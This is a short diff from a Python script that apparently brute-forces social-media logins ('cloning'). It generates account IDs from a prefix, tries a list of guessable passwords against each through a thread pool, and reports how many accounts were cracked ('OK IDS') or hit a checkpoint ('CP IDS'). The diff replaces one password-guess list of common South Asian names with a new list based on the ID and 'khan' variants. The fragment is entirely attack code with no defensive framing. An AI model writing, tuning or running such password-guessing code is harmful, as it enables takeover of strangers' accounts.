@@ -1057,7 +1057,7 @@ def pass5():
         print(f'{RED}======================================================')
         for love in user:
             uid = code+love
-            pwx = ['bangladesh','sadiya','nusrat','hridoy','mababa','sahin'']
+            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
             manshera.submit(freeq,uid,pwx,tl)
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
